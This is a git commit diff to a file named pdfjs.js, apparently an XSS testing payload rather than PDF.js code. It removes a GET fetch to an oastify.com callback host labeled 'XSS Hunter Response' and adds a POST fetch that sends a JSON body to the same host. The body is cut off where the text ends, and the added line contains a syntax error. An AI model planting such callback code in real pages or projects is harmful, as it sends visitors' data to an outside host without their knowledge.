cfa207aa15aede402b391e013223a4cda9c180fe
last0x01 <290016262+last0x01@users.noreply.github.com>
2026-07-15 17:43:26 +0300

    Change fetch from GET to POST request
    Removed GET request and replaced it with a POST request.

--- pdfjs.js
+++ pdfjs.js
@@ -1,9 +1,3 @@
-fetch('https://wyyj5imoxv7w3td2jx0qztindej57vvk.oastify.com')
-  .then(response => response.text())
-  .then(data => {
-    console.log('XSS Hunter Response:', data);
-  })
-
 fetch('https://wyyj5imoxv7w3td2jx0qztindej57vvk.oastify.com'', {
   method: 'POST',
   body: JSON.stringify({
